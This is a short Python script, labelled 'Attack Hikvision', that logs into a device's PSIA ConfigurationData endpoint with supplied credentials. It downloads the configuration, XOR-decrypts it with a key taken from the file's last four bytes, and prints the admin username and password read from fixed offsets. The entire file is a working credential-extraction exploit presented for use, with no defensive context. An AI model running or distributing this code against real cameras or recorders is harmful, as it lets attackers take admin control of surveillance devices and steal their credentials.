import requests
import base64
import argparse
import sys
from urllib.parse import urlparse

def decrypt(config):
    print('[*] Decrypting config')
    key = config[-4:]
    plaintext = ''.join(
        chr(config[i * 4 + j] ^ key[j % 4]) for i in range(len(config) // 4) for j in range(4)
    )
    return plaintext

def attack(target, username, password, output):
    base_url = f'http://{target}/PSIA/System/ConfigurationData'
    auth_header = base64.b64encode(f'{username}:{password}'.encode()).decode()
    headers = {'Authorization': f'Basic {auth_header}'}

    print(f'[*] Attacking {target}')
    try:
        response = requests.get(base_url, headers=headers, timeout=5)
        response.raise_for_status()
        config = response.content
    except requests.exceptions.RequestException as e:
        print(f'Error: {e}')
        return

    plaintext = decrypt(config)
    print(f'[*] Writing output file {output}')
    with open(output, 'w', encoding='utf-8') as f:
        f.write(plaintext)

    user = plaintext[0x45A0:0x45A0 + 32].strip('\x00')
    pwd = plaintext[0x45C0:0x45C0 + 16].strip('\x00')
    print(f'Probably the admin user is {user}, and the password is {pwd}')
    print("If it doesn't make any sense, just do a strings of the output file")

def main():
    parser = argparse.ArgumentParser(description='Attack Hikvision')
    parser.add_argument('target', help='target host to attack')
    parser.add_argument('username', help='username to be used to authenticate against target')
    parser.add_argument('password', help='password')
    parser.add_argument('output', help='filename to write the plaintext config')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    attack(args.target, args.username, args.password, args.output)

if __name__ == '__main__':
    main()
